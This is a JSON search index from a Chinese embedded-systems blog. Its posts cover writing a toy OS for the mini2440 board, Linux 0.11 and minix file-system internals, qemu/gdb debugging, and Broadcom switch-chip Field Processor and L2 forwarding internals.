{"meta":{"title":"芯机智","subtitle":null,"description":null,"author":"madhex","url":"http://demonelf.github.io"},"pages":[{"title":"所有分类","date":"2019-08-28T09:02:26.604Z","updated":"2019-08-28T08:59:53.839Z","comments":true,"path":"categories/index.html","permalink":"http://demonelf.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"编写操作系统思路","slug":"EMBEDDED/mini2440/编写操作系统思路","date":"2019-08-29T04:27:44.162Z","updated":"2019-08-29T04:26:00.125Z","comments":true,"path":"EMBEDDED/mini2440/编写操作系统思路.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/mini2440/编写操作系统思路.html","excerpt":"计算机基本硬件：I/O接口 硬盘 内存 CPU 时钟 看门狗 ​ 内存(有可能需要考虑 MMU和cache等) ​ CPU(中断) 操作系统分为 两部分 ： 1. 资源部分：以文件系统的方式呈现 2. 调度部分：以多进程的方式呈现 操作系统说","text":"计算机基本硬件：I/O接口 硬盘 内存 CPU 时钟 看门狗 ​ 内存(有可能需要考虑 MMU和cache等) ​ CPU(中断) 操作系统分为 两部分 ： 资源部分：以文件系统的方式呈现 调度部分：以多进程的方式呈现 操作系统说复杂也确实很复杂，但是如果从简单点的角度去看他，其实也没那么玄乎，我们先不要考虑mmu，毕竟没有mmu的情况也有好多操作系统。没有mmu就是直接内存。开始不要有内存顾虑，然后就是中断，我们自己写的库是直接调用的，而内核也算是一个库吧，只是这个库自己也在运行，并且调用方式是通过中断。 我们的大体方向为两面夹击型，其实有人问嵌入式linux怎么学，应该先从什么开始学，我理解为没有什么固定应该从那里学，从你最熟悉的部分开始学，这样好理解，你直接只会裸板开发，那你就能简单熟悉下linux命令，开始设备驱动。如果之前是应用开发，那就从你熟悉角度去理解。不管从哪个方向走，都会是条条大路通罗马。 像如果想熟悉linux kernel，我们还是最好从简单的开始，两面夹击型。我们最好有裸板经验，然后是设备驱动经验。然后再开始内核框架。我想这样最好了。 操作系统的功能： 1.管理硬件，这就是为什么linux要有设备驱动的概念。 2.程序调度，能让这个机器cpu等发挥更多的性能。 以上也是比bootloader多出的重要部分。当然为了多进程的调度更加方便和内存利用最大化，还应多出了重要器件mmu。并且，为了让进程能用到硬件，还通过中断提供了一系列系统调用。其实对应用来说内核就是一个稍微特殊点的库而已。 我们先还管不了应用，我们先把内核自己运行溜了，并且能管理起来各个硬件再说，这其实就是实现了一个简单的bootloader一样的东西。然后我们想更容易用这些硬件，我们提出了文件系统等一些概念。 大家看看内核这个程序的大致结构：这个图果然很经典。 调度部分是本内核程序控制别的程序运行功能。额，暂可把它当作内核大大的一个小功能即可。我的的思路是先把内核自己想要运转溜了，所以，就不要想先玩转别人。 貌似，这有点像我们先实现一个bootload。bootload的功能就是加载内核。而我们这个功能只是多一点而已。 我应该简单总结下bootload的编写流程，然后如果在bootload基础上添加：文件系统、进程调度等功能。实现操作系统的样子。 操作系统的发展估计也是这个样子，逐步添加小功能呗。 bootload编写流程： 熟悉板子引导流程，编写最开始的引导部分代码，最好是汇编。 初始化一些必要的硬件可以用c。有：时钟、ram、nand、串口。 编写shell。添加一些必要的命令。基本就以上这些。算是最基本的bootloader。 我们可以在以上bootloader的基础上添加例如：文件系统，内存管理、调度等功能就成为了操作系统。 有了思路就好办了， 由于操作系统比较庞大，而且要求每个模块的逻辑协作比较复杂。所以我想在实现操作的时候可以先订个小目标。例如：我先不实现调度部分，我先能实现资源部分。能够通过文件系统访问资源。 第一个小目标：在终端实现执行ls 当然，由于硬件支持用户态和内核态能，先都放下，我们只在内核态实现。 其实，如果添加用户态和内核态功能，程序在调用的时候只是利用了中断方式，但为了简单和入门。我们不走此流程。现在只是先入门并能够开始。 首先：我把硬件平台简单描述下，毕竟我们是要在一个特定的硬件实现系统。当然我们不深入讨论体系结构或是组成原理。不然我们有可能陷入另一个学科，而不是此次的实践目的了。 一个程序想要通过CPU实现执行，必须是CPU可随机访问的。我所说的内存当然满足此要求。但是内存是掉电丢失的，所以我们要把程序先放到可以掉电不丢失的硬盘上。当然不是硬盘软盘、光盘、u盘随便你喜欢什么都可以，只要能保存程序就可以了。有了以上认识，我们就可以总结出，想要运行我们的系统。必须要有cpu、内存、硬盘。 我们以s3c2440为例子，s3c2440的cpu为arm920，内存为外置sdram， 硬盘为nand 当然用到的硬件肯定不止这些，但是我们可以用到哪些了解哪些就可以了。 以上为最基本硬件信息， 但是我们还需要有个输入输出、不然怎么操作我们的系统 ，呵呵。 说到输入输出，又想提一下串口和文件系统， 因为我们想通过串口操作我们的系统，但是我们又不想太low，直接操作硬件，不然我们要操作系统干什么，而linux是一切皆文件的思想，文件的体现方式为文件系统实现的。所以还是有必要提一下文件系统。 我们先以read/write来入手，层层剥开文件系统的面纱。 因为想要 write 的实现原理以下为write定义 lib目录下 - 用户系统接口 write.c1_syscall3(int,write,int,fd,const char *,buf,off_t,count) unistd.h123456789101112#define _syscall3(type,name,atype,a,btype,b,ctype,c) \\type name(atype a,btype b,ctype c) \\&#123; \\long __res; \\__asm__ volatile (\"int $0x80\" \\ : \"=a\" (__res) \\ : \"0\" (__NR_##name),\"b\" ((long)(a)),\"c\" ((long)(b)),\"d\" ((long)(c))); \\if (__res&gt;=0) \\ return (type) __res; \\errno=-__res; \\return -1; \\&#125; 从以上可以看出wirte是通过80中断到内核的，内核通过以下处理 kernel目录下 - 内核中断处理 set_system_gate(0x80,&amp;system_call);和system_call.s和sys_call_table[] 真正执行到：read_write.c fs目录下 - 真正调用到内核的函数 int sys_write(unsigned int fd,char * buf,int count) 可以看出，期间以上参数可以通过寄存器传递。 也完全像内核注释上所说，用户通过系统调用到了文件系统。​ 在用户态write的函数，就不用说了大家肯定已经很熟悉了，有必要说的就剩下内核终端处理部分，和文件系统实现部分了。 想要实现文件系统，根据上面的图，大家发现我们要先实现块设备。呵呵。我们又要先实现字符设备和块设备驱动程序。 字符设备先放放，我们先看看块设备。 块设备底下为nand flash，我们这个块设备要把nand flash抽象后给文件系统提供接口。","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"},{"name":"mini2440","slug":"EMBEDDED/mini2440","permalink":"http://demonelf.github.io/categories/EMBEDDED/mini2440/"}],"tags":[]},{"title":"文件系统理解","slug":"EMBEDDED/mini2440/文件系统理解","date":"2019-08-29T04:18:26.915Z","updated":"2019-08-29T04:16:02.640Z","comments":true,"path":"EMBEDDED/mini2440/文件系统理解.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/mini2440/文件系统理解.html","excerpt":"以下都是自己瞎理解，并不一定对，但会慢慢完善。 我们可以想象下，linux文件系统，是吧我们想利用的资源，以虚拟一种树状目录结构管理。最初我们主要想把，硬盘上的内容以树状的结构管理起来。 但是发现，其实好多硬件都可以放到这个树中。例如：字符设备串口等。","text":"以下都是自己瞎理解，并不一定对，但会慢慢完善。 我们可以想象下，linux文件系统，是吧我们想利用的资源，以虚拟一种树状目录结构管理。最初我们主要想把，硬盘上的内容以树状的结构管理起来。但是发现，其实好多硬件都可以放到这个树中。例如：字符设备串口等。这要我们能清楚的管理硬件。简单既是美。这也是linux可能玩不了复杂的，只能简单的想到一切皆文件的理念吧。 我们先不考虑虚拟文件系统，其实虚拟文件系统只是在我们这个真实的文件系统上再虚拟一层。因为可能由于兴趣原因，我们不想在每个硬盘上都放一种真实文件，有的像放fat，有的想放ext3，有的想法minix。呵呵，有点开玩笑。由于一个电脑上有多个文件系统。我们又不想让用户用写个应用还得open_ext3 read_ext3z这个样子。所以我们又封装了以下open-&gt;open_ext3,用户还是只要调用open就可以了，所以有了虚拟文件系统。不过我们现在不想管，我们就一个文件系统minix。因为我怕乱了，额。 还是以上经典图： 下面minix文件系统在硬盘上的结构 超级块用于存放盘设备上文件系统结构信息 i节点存放着文件系统中文件或目录名的索引节点，每个文件或目录都有一个i节点。 逻辑块位图用于描述盘上每个数据盘款的使用情况。 i节点位图用于说明i节点是否被使用。 int bmap(struct m_inode * inode,int block) bmap实现了以上i节点和超级块的关联。 namei也是利用bmap解析文件系统中树目录结构 下面你会发现namei处在什么位置。 linux下文件系统和块设备包含的一些概念： 主设备号：blk_dev[NR_BLK_DEV] 从设备号： 通过blk_dev[MAJOR_NR].request_fn = DEVICE_REQUEST;注册void do_hd_request(void)功能 看看linux 0.11是怎么通过read调用到硬盘上的。 调用流程12345678910111213141516171819应用| read-&gt;中断Vread_write.c----------------文件系统上层接口-----------------| sys_readVfs/block_dev.c--------------文件系统下层/块设备接口-----------| block_readVfs/buffer.c | breadaVblk_drv/ll_rw_blk.c---------块设备/设备驱动上层接口----------| ll_rw_block-&gt;make_request-&gt;add_request-&gt;request_fn| -&gt;do_hd_requestVkernel/blk_drv/hd.c---------设备驱动底层接口----------------| do_hd_requestV 每个任务都有一个自己的task_struct current;current中包含了任务打开的文件fd。struct file filp[NR_OPEN]; open.copen|Vopen_namei次函数是操作文件系统树目录的重要体现接口。 open_namei返回的是struct m_inode12345678910111213141516171819202122struct m_inode &#123; unsigned short i_mode; unsigned short i_uid; unsigned long i_size; unsigned long i_mtime; unsigned char i_gid; unsigned char i_nlinks; unsigned short i_zone[9];/* these are in memory also */ struct task_struct * i_wait; unsigned long i_atime; unsigned long i_ctime; unsigned short i_dev; unsigned short i_num; unsigned short i_count; unsigned char i_lock; unsigned char i_dirt; unsigned char i_pipe; unsigned char i_mount; unsigned char i_seek; unsigned char i_update;&#125;; 123456789101112131415161718192021struct super_block &#123; unsigned short s_ninodes; unsigned short s_nzones; unsigned short s_imap_blocks; unsigned short s_zmap_blocks; unsigned short s_firstdatazone; unsigned short s_log_zone_size; unsigned long s_max_size; unsigned short s_magic;/* These are only in memory */ struct buffer_head * s_imap[8]; struct buffer_head * s_zmap[8]; unsigned short s_dev; struct m_inode * s_isup; struct m_inode * s_imount; unsigned long s_time; struct task_struct * s_wait; unsigned char s_lock; unsigned char s_rd_only; unsigned char s_dirt;&#125;;","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"},{"name":"mini2440","slug":"EMBEDDED/mini2440","permalink":"http://demonelf.github.io/categories/EMBEDDED/mini2440/"}],"tags":[]},{"title":"qemu模拟mini2440调试手册","slug":"EMBEDDED/mini2440/qemu模拟mini2440调试手册","date":"2019-08-29T04:18:26.899Z","updated":"2019-08-29T04:15:56.472Z","comments":true,"path":"EMBEDDED/mini2440/qemu模拟mini2440调试手册.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/mini2440/qemu模拟mini2440调试手册.html","excerpt":"前情提要 最近想在mini2440上模仿linux 0.12的代码实现arm版本的linux。 一来是想巩固下arm，在就是学习下操作系统的相关只是。 哎、最后之前的想法非常幼稚，心想学就学最新，当时想看懂linux 3.x的版本。 没想到越看越老，从3","text":"前情提要 最近想在mini2440上模仿linux 0.12的代码实现arm版本的linux。一来是想巩固下arm，在就是学习下操作系统的相关只是。哎、最后之前的想法非常幼稚，心想学就学最新，当时想看懂linux 3.x的版本。没想到越看越老，从3.x到2.x, 再到0.12 呵。我想真把 0.12 玩的非常通其实也不是件易事。从硬件到系统，mmu到进程，等等。如何有机的组在一起运行起来，也是很费精力。 废话不多说，学习的环境为，gentoo + qemu_mini2440. 说实话如果你条件方便，还是买个板子吧， 因为学操作系统和硬件非常相关。而qemu虚拟只是模拟出用到的基本功能，和真实的硬件环境确实相差不少。例如，在真是环境中，mini2440 的启动方式为，sd 或nand 到 stepping stone,然后再纠结的到sdram。但是到了qemu你就醉了，它是直接把代码拷贝到sdram的。你说你是不很闹心。玩起来是不并不是随心所欲了 呵呵。 发现此问题是通过gdb调试发现。 在此顺便记下qemu_gdb方法： qemu启动： qemu-system-arm -M mini2440 -m 256m -mtdblock mini2440_nand128.bin -serial stdio -nographic -gdb tcp::1234 -S gdb启动： gdb1234567(gdb) file vmlinux(gdb) target remote :1234(gdb) b start_kernel(gdb) c(gdb) x /200xb 0x004013ce //以十六进制查看内存(gdb) x /10i main //以汇编的方式查看内存(gdb) disassemble main //等同上面","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"},{"name":"mini2440","slug":"EMBEDDED/mini2440","permalink":"http://demonelf.github.io/categories/EMBEDDED/mini2440/"}],"tags":[]},{"title":"BCM芯片FP原理及相关SDK数据结构介绍","slug":"EMBEDDED/BCM芯片FP原理及相关SDK数据结构介绍","date":"2019-08-29T04:18:26.899Z","updated":"2019-08-29T04:16:45.181Z","comments":true,"path":"EMBEDDED/BCM芯片FP原理及相关SDK数据结构介绍.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/BCM芯片FP原理及相关SDK数据结构介绍.html","excerpt":"作者: 北京—小武 邮箱：night_elf1020@163.com 新浪微博：北京-小武 BCM芯片有几个大的模块： VLAN、L2、L3和FP等几个，其中FP的使用也最为灵活，能解析匹配数据包文的前128字节比特级的内容，动作包括转发、丢弃","text":"作者: 北京—小武 邮箱：night_elf1020@163.com 新浪微博：北京-小武 BCM芯片有几个大的模块： VLAN、L2、L3和FP等几个，其中FP的使用也最为灵活，能解析匹配数据包文的前128字节比特级的内容，动作包括转发、丢弃、结合qos修改相应字段、分配vid、流镜像、流重定向、指定端口转发（比如CPU口）、指定下一跳转发往、指定隧道转发等，往往在实现功能上有意想不到的功效。简单来说，如果硬件和BSP分别是九阳真经和九阴真经的话，那么port和vlan是少林七十二项绝技的组合，L2转发则是显得有点悠闲的峨眉派功夫，当然L3则是以太极拳为代表的武当派功夫，那么FP可以是以乾坤大挪移、吸星大法等为代表的魔教的邪而又邪的”旁门左道”，当然其他功能是零零散散的其他门派功夫。能够灵活运用好FP是增加很多交换机新功能的一种常用的手段。本文总结下FP这个模块BCM在硬件上的实现原理及SDK的相关数据结构。因为FP在实现功能上的灵活性，在此希望能抛砖引玉，激发大家更多的应用FP实现新功能的火花。 BCM芯片FP实现原理 FP的全称是Fields Processors，也称为ContentAwareProcess（CAP），在BCM较早的芯片称为Fast Filter Processors（FFP），和现在的FP相比有一些原理不同，不过现在交换芯片已经不再使用FFP，所以在此也不再介绍。FP本质来说，是一组相互之间有关联的表，一起通过查找、匹配等来决定对报文施加的动作；在BCM芯片交换机中，有三种查找查找方式：hash，index，tcam。FP的查找主要用到了index和tcam，其中CAM的全称是ContentAddressable Memory，中文是内容寻址器，TCAM则是Ternary ContentAddressable Memory，中文称为三态内存寻址器，TCAM的实现是通过对应比特位+掩码产生三种匹配方式：掩码为0表示不关心、掩码为1且对应位为1或掩码为1且对应位为0。 这就是三态的具体含义。 在我们自研交换机所用的芯片中有三个FP：VFP(VLAN FP)、IFP（ingres FP）和EFP（Egress FP），另外在四代芯片kylin卡中曾出现外扩FP，称为E-IFP，表项大小为128K，为L2和L3转发用，有点openflow的意味。其中VFP主要用于对报文tag的处理，比如添删或修改vid的灵活QINQ的实现就基于此FP；IFP的用途比较多，主要是对进入端口后的报文进行处理，主要有入口acl、流重定向、流镜像、设置下一跳、为qos数据报文分类等用途；EFP的用途和IFP类似，但是因为EFP是报文在转出前在出端口进行处理的规则，IFP有的动作类型在EFP不太适用。虽然三种FP用途和数据包流经顺序不太一样，但是硬件原理是一致的。下面介绍下FP的硬件原理。 图1 FP原理组成图 图1中，每一个查找引擎和策略引擎及后面的counter资源和meter资源组合成一个规则组，芯片称之为一个slice，从图1可以看出，FP的实现有五部分组成： 智能解析模板：主要将报文信息（最多报文前128字节，可以精确到每一位bit）根据对每个slice的care字段将各对应字段解析出来，再加上前面L2、L3的转发信息，一起送给每个slice的查找引擎去匹配； 查找引擎：将解析出来的字段按照TCAM方式去查找本slice的规则是否有匹配的，即HIT的，只要有一条hit的即刻返回这条规则的index不再继续查找本slice后面规则，后面即使还有匹配的规则；这样做就是为了保证一个slice内部规则的优先级；如果没有匹配说明此slice没有匹配的规则或根本就没有规则，后面的流程也无需再走； 策略引擎：根据查找引擎得到的index直接索引策略引擎的动作，动作类型有转发、丢弃、重定向（包括到CPU口且可指定队列）、流镜像（包括到CPU口且可指定队列）、修改报文特定的字段（COS、DSCP、EXP等）、与后面的meter一起对报文染色并对不同染色报文指定相应动作、指定下一跳、指定ECMP、指定TTL是否修改、指定URPF的模式等相关动作；需要说明的是，一条规可以对报文执行多种动作，当然需要报文动作之间是不冲突的，即slice规则的动作冲突是靠配置下发来检查的，同一条规则有冲突的动作无法下发硬件； Counter和meter资源： counter资源用于计数，有基于byte和packet的两种方式；meter主要用于测速，然后根据速度对报文进行染色（绿、黄和红）然后对报文应用不同的QOS策略；meter的工作原理可以参见我原先写的有关令牌桶相关文档。 动作冲突决策引擎：前面说过，一条slice的动作冲突是靠配置下发检查来实现的，冲突的动作无法同时下发到硬件；但是FP通常有多个slice，每个slice都有规则被匹配且动作时间有冲突时，需要动作冲突决策引擎来处理到底执行哪一个规则的动作，如果多个动作不冲突都执行；原则是丢弃、重定向等优先级最高，其他时候看slice号（这个slice号有的芯片只支持是物理的，高级芯片支持虚拟slice号），slice号越大优先级越高； 我们一条规则的匹配报文长度信息是有限的，对于IPV4报文同时匹配SMAC、DMAC、SIP、DIP等信息的时候，就不够了，芯片提供了将两条规则合并成一条规则，组成更大长度规则的方法，主要有图2示的两种,： 图2 两种slice宽模式 第一种是将一条slice的规则分为前后两部分，然后进行如图2左边的方式拼成double模式，这种模式称为double wide模式；第二种是用两条slice，直接如图2右边所示的方式拼成double模式，这种拼接方式称之为slice-paring模式。这两种模式，有的低级芯片都不支持，只能用单倍模式，有的芯片支持其中一种，我们的redstone交换机就只支持左边的这种方式。还有的芯片可以同时支持这两种拼接方式，那么就可以利用这点拼接处具有更大长度信息的四倍模式： 图3 四倍key模式 这种模式常用于IPV6报文的匹配中，因为IPV6的SIP和DIP实在太长了，再加上匹配其他信息，只能用四倍模式才能完全覆盖所有字段。但是我们的redstone交换机只支持slice-pairng模式，所以在IPV6报文的匹配中需要做折中。 前面我们提到slice有物理slice和虚拟slice，这个与物理内存和虚拟内存有点类似，FP都有物理slice，在高级的芯片上，为了更好的解决slice之间的动作冲突，对slice进行了虚拟编号，虚拟slice号越大优先级越高，这样就可以实现动作的优先级指定；可能做过物理slice的同学能体会为了保证各种应用slice的优先级在软件处理所做的代码处理工作有多么的艰辛；硬件进步这么一步，支持虚拟slice后，这部分工作就完全交给硬件来处理了，我们只需要指定优先级高低就可以了。而且虚拟slice还支持虚拟slice组的概念，每一个虚拟slice组就像一条slice一样，只会有一个动作产生出，这样就又大大减少了动作冲突的机会，而且还能使得每种应用使用更多的slice资源，无需考虑因为物理slice带来的动作优先级打破应用的优先级，更符合实际。 BCM对FP操作的接口 BCM的SDK提供了四套对于FP资源使用和管理的函数接口，需要视具体应用环境和个人喜好来定夺，四种接口如下： SOC API：直接硬件表项或寄存器操作，BCM各种问题明确不提倡的接口，因为需要配置人员管理和组织大量的逻辑； Bcmx接口：通常不被使用的接口，因为不太灵活，且SDK被改造成为所有ACL规则为一个大的group，现在暂时IFP只有协议规则和ACL使用，所以还勉强满足需求，以lport作为端口的配置参数；但是每次下发新规则都要先删除原来规则，这个是没有必要的；这套接口和下面BCM接口的区别不是很大。相关函数接口有： bcmx_field_group_create bcmx_field_group_create_id bcmx_field_group_compress bcmx_field_group_install bcmx_field_group_remove bcmx_field_group_destroy bcmx_field_entry_create bcmx_field_entry_destroy bcmx_field_entry_destroy_all bcmx_field_data_qualifier_destroy bcmx_field_data_qualifier_destroy_all bcmx_field_qualify_clear bcmx_field_dataqualifier**_add bcmx_field_dataqualifier**_ delete等。 Bcm接口：BCM中对FP操作的最灵活的一组接口，非常适合运营商多种应用的场合，这组接口传递的参数也非常详细；相关函数接口有： bcm_field_group_create bcm_field_group_create_id bcm_field_group_priority_set bcm_field_group_compress bcm_field_group_install bcm_field_group_remove bcm_field_group_destroy bcm_field_entry_create bcm_field_entry_create_id bcm_field_entry_destroy bcm_field_entry_destroy_all bcm_field_entry_reinstall bcm_field_entry_remove bcm_field_qualify_clea bcm_fieldqualify** bcm_field_action_add bcm_field_action_delete等。 Bcma接口：这套接口称为AdvancedContentAware Enhanced Software (ACES) implementation，传递的参数为bcma_acl_t*list，以结构体形式将规则所有参数下发到硬件； / List Management functions / extern int bcma_acl_add(bcma_acl_t*list_id); extern int bcma_acl_remove(bcma_acl_list_id_tlist_id); extern int bcma_acl_get(bcma_acl_list_id_tlist_id, bcma_acl_t *list); extern intbcma_acl_rule_add(bcma_acl_list_id_t list_id, bcma_acl_rule_t*rule); extern int bcma_acl_rule_remove(bcma_acl_list_id_tlist_id, bcma_acl_rule_id_t rule_id); extern intbcma_acl_rule_get(bcma_acl_rule_id_t rule_id, bcma_acl_rule_t **rule); / Validation and Installation functions / extern int bcma_acl_install(void); extern int bcma_acl_uninstall(void); 等。 SDK对FP资源管理的相关数据结构 1. BCM芯片每一个unit都有这么一个结构体来保存芯片所有FP的资源占用情况： static _field_control_t *_field_control[BCM_MAX_NUM_UNITS]; field_control_t的具体内容为（每个变量都有详细注释，此处不再阐述）： struct _field_control_s { sal_mutex_t fc_lock; / Protectionmutex. / bcm_field_stage_t stage; / Default FP pipeline stage. / int max_stage_id; / Number of fpstages. / _field_udf_t udf; / field_status-&gt;group_total */ struct _field_group_s groups; / List of groupsin unit. */ struct_field_stage_s stages; / Pipeline stage FP info. } 2. 然后对field_control_t中的_field_group_s表示一种应用占用的slice和slice的规则记录： _field_group_s { bcm_field_group_t gid; / Opaque handle. / int priority; / Field grouppriority. / bcm_field_qset_t qset; / This group’s Qualifier Set. / uint8 flags; / Group configuration flags. / _field_slice_t slices; / Pointer intoslice array. */ bcm_pbmp_t pbmp; / Ports in use this group. / _field_sel_t sel_codes[_FP_MAX_ENTRY_WIDTH]; / Select codes forslice(s). / _bcm_field_group_qual_t qual_arr[_FP_MAX_ENTRY_WIDTH]; /* Qualifiers available in each individual entry part. */ _field_stage_id_t stage_id; / FP pipeline stage id. / } 3. 在每一个unit中还有_field_stage_s来对各种FP（VFP/IFP/EFP）的资源记录的数据结构： typedef struct _field_stage_s { _field_stage_id_t stage_id; / Pipeline stageid. / uint8 flags; / Stage flags. / int tcam_sz; / Number ofentries in TCAM. / int tcam_slices; / Number ofinternal slices. / struct_field_slice_s slices; / Array of slices.*/ } 4. 在在每一个_field_stage_s中用_field_slice_s对每一个slice资源进行记录的结构体： _field_slice_s { uint8 slice_number; / Hardware slicenumber. / int start_tcam_idx;/ Slice first entry tcam index. / int entry_count; / Number of entriesin the slice./ int free_count; / Number of freeentries. / int counters_count;/ Number of counters accessible. / int meters_count; / Number of metersaccessible. / _field_counter_bmp_t counter_bmp; / Bitmap forcounter allocation. / _field_meter_bmp_t meter_bmp; / Bitmap for meterallocation. / _field_stage_id_t stage_id; / Pipeline stageslice belongs. / bcm_pbmp_t pbmp; / Ports in use by groups. / struct _field_entry_s *entries; / List of entriespointers. */ } 5. 在在每一个_field_slice_s中用_field_entry_s对slice内部的entry进行记录： struct_field_entry_s { bcm_field_entry_t eid; / BCM unit unique entryidentifier / int prio; / Entry priority / uint32 slice_idx; / Field entry tcam index. / uint16 flags; / _FP_ENTRY_xxx flags / _field_tcam_t tcam; / Fields to be written intoFP_TCAM / _field_tcam_t extra_tcam; #ifdefined(BCM_RAPTOR_SUPPORT) || defined(BCM_TRX_SUPPORT) _field_pbmp_t pbmp; / Port bitmap / #endif /BCM_RAPTOR_SUPPORT || BCM_TRX_SUPPORT / _field_action_t actions; / linked list of actions for entry */ _field_slice_t fs; / Slice where entry lives */ _field_group_t group; / Group where entry lives */ _field_entry_stat_t statistic; / Statistics collection entity. / /Policers attached to the entry. / _field_entry_policer_tpolicer[_FP_POLICER_LEVEL_COUNT]; #ifdefined(BCM_KATANA_SUPPORT) _field_entry_policer_tglobal_meter_policer; #endif struct _field_entry_s next; / Entry lookup linked list. */ }; 上面actions 是一个_field_action_t的结构体的链表，其信息为： typedef struct_field_action_s { bcm_field_action_t action; / action type / uint32 param0; / Action specific parameter / uint32 param1; / Action specific parameter / uint8 inst_flg; / Installed Flag / struct _field_action_s *next; }_field_action_t; 6. 在SDK编码中，用UNIT号获取对应的_field_control_t信息的代码可以如下： _field_control_t *fc; BCM_IF_ERROR_RETURN(_field_control_get(unit,&amp;fc)); 7. 进而获取每一个group资源的代码可以如下： _field_group_t *fg; fg = fc-&gt;groups; while (fg != NULL) { if (fg-&gt;gid == gid) { *group_p = fg; return (BCM_E_NONE); } fg = fg-&gt;next; } 8. 获取每一个slice的资源可以如下 _field_slice_t *slices; slice =&amp;fg-&gt;slices[0]; while(slice !=NULL){ slice = slice-&gt;prev; } 9. 获取slice中规则的的资源可以如下： _field_entry_t *f_ent; _field_action_t *fa_iter; _field_entry_get(unit, entry, _FP_ENTRY_PRIMARY,&amp;f_ent);//entry fa_iter = f_ent-&gt;actions;//entry的action 熟悉FP同学可能深知FP资源的稀缺性和重要性，可以用惜slice如黄金来做比喻；虽然FP的规则数很多，但是FP的资源申请和释放是按照slice为单位来进行的，且slice的数目一般都不是很多；所以我们要将尽量多的规则整合到一个slice里，尽量减少slice里有规则被浪费的现象；这个也是再将来的协议改造中必须考虑到的一个因素。 到这里对FP的原理和SDK的相关数据结构介绍到这里，如果描述中有不清晰或者不准确的地方欢迎随时沟通讨论。","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"BCM56151路由学习总结","slug":"EMBEDDED/BCM56151路由学习总结","date":"2019-08-29T04:18:26.884Z","updated":"2019-08-29T04:16:37.965Z","comments":true,"path":"EMBEDDED/BCM56151路由学习总结.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/BCM56151路由学习总结.html","excerpt":"1. # BCM包处理原理 L2转发流程 1. # L2转发流程 对于交换芯片来说，L2转发是一个最基本的功能。 2.1 L2功能主要包括： ingre","text":"# BCM包处理原理 L2转发流程 # L2转发流程 对于交换芯片来说，L2转发是一个最基本的功能。 2.1 L2功能主要包括： ingress过滤、 MAC学习和老化、 根据MAC+VLAN转发、 广播与洪泛、 生成树控制等基本功能。 2.2 L2转发的具体流程如图3所示： 图3 L2转发流程 2.3 L2转发流程从端口进入交换芯片的包首先检查TAG，对于tagged包，判断是否是802.1p的包，（802.1p的包vid为0），对于untagged的包和802.1p的包，根据系统配置加上tag（这些配置包括：基于MAC的vlan、基于子网的vlan、基于协议的vlan和基于端口的vlan）。经过这一步以后，到交换芯片内部的包都变成802.1Q的tagged包了（vid为1－4094，4095保留）， 如果设置了ingress过滤，就会检查本端口是否在该vid对应的VLAN中，对于本端口不在该vid对应的VLAN中的包就丢弃。对于没有设置ingress过滤，或者设置ingress过滤但本端口在该vid对应的VLAN中的包进行STP端口状态检查，对于BPDU以外的包，只有端口处于forwarding状态，才允许包进入。 然后进行原MAC地址检查，以原MAC＋VID的哈希为索引查找L2 TABLE， 如果没有找到，就把这个表项（原MAC＋VID）以及对应的端口写到L2 TABLE中，这个过程称为MAC地址学习。当然地址学习的方法有很多种，可以是硬件学习，也可以是软件学习，可以根据PORT表中的CMI字段的配置来进行。 下一步进行目的MAC地址检查：目的MAC地址为广播地址（0xffffffff）的包，在vlan内广播出去；目的MAC地址为组播地址的包，进行组播流程的处理；对于单播包，查找L2 TABLE，如果没有找到，就在vlan内进行洪泛； 如果找到，检查表项中的L3 bit是否设置， 如果设置了L3 bit，就进行L3流程的转发； 否则就转发到L2 TABLE表项中的端口去，在egress方向，也有egress过滤设置（默认是使能的），如果egress端口不在vlan中也是不能转发的。 至此，L2转发流程完成了。 与地址学习相反的过程是地址老化。地址老化的机制是：ASIC内部有个定时器，称为age timer，命令行可以对这个寄存器进行设置，每次查找L2 TABLE时（包括原地址查找和目的地址查找，可以配置），如果命中，就会设置hit标志。当老化时间到后，ASIC把hit标志清除，当下一个老化时间到后，ASIC把hit为0的地址设置为无效，这就是为什么实际地址老化的时间为1～2倍agingTime的原因。 2.4 L2转发相关的表项2.4.1 port表 图4 port表 Port表是一个非常重要的表，有很多与端口相关的控制都在这里设置。每个端口对应一个表项，按端口号进行索引。 下面介绍一下重要的设置： 1) PVID ：设置PORT_VID 2) 缺省优先级 ：设置PORT_PRI 3) 流分类使能 ：设置FILTER_ENABLE 4) VLAN转换使能 ：设置VT_ENABLE和VT_MISS_DROP 5) Ingress过滤使能：设置EN_IFILTER 6) 信任COS还是信任DSCP ：对于IPV4：TRUST_DSCP_V4=0:信任COS； TRUST_DSCP_V4=1 : 信任DSCP，对于IPV6：同样设置TRUST_DSCP_V6。 7) Ingress方向mirror使能：设置MIRROR 8) MAC地址学习方式 ：设置CML 9) IP组播是否使用VLAN信息：设置IPMC_DO_VLAN 10) L3转发使能 ：设置V4L3_ENABLE和V6L3_ENABLE 11) 是否丢弃BPDU ：设置DROP_BPDU 12) 控制是否转发带tag和不带tag的包：设置PORT_DIS_TAG和PORT_DIS_UNTAG 13) Pause帧控制 ：设置PASS_CONTROL_FRAMES 14) 基于子网的VLAN使能 ：设置SUBNET_BASED_VID_ENABLE 15) 基于MAC的VLAN使能 ：设置MAC_BASED_VID_ENABLE 16) 设置堆叠口 ：HIGIG_PACKET 17) 设置NNI口 ：NNI_PORT 18) 修改优先级使能 ：MAP_TAG_PACKET_PRIORITY 19) 堆叠口modid设置 ：MY_MODID 20) Out tpid设置 ：OUTER_TPID 21) 基于MAC和基于子网的VLAN优先级设置：VLAN_PRECEDENCE 22) 是否允许单臂桥功能 ：PORT_BRIDGE 23) IP组播位图设置 ：IGNORE_IPMC_L2_BITMAP和IGNORE_IPMC_L3_BITMAP 2.4.2 L2地址表 图6 L2地址表 